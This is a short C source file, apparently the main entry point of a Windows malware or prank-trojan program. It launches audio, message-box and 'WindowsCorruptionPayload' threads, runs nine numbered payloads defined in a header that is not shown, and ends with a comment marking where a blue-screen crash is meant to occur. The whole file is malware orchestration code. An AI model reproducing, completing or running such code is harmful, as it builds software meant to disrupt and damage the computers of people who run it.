#include "payloads.h"
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nCmdShow) {
	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModUser32);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayload), 0, 0, NULL);

	ExecutePayload(Payload1, PAYLOAD_TIME);
	ExecutePayload(Payload2, PAYLOAD_TIME);
	ExecutePayload(Payload3, PAYLOAD_TIME);
	ExecutePayload(Payload4, PAYLOAD_TIME);
	ExecutePayload(Payload5, PAYLOAD_TIME);
	ExecutePayload(Payload6, PAYLOAD_TIME);
	ExecutePayload(Payload7, PAYLOAD_TIME);
	ExecutePayload(Payload8, PAYLOAD_TIME);
	ExecutePayload(Payload9, PAYLOAD_TIME);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
	Sleep(30000);
	//bsod here.
	return 0;
}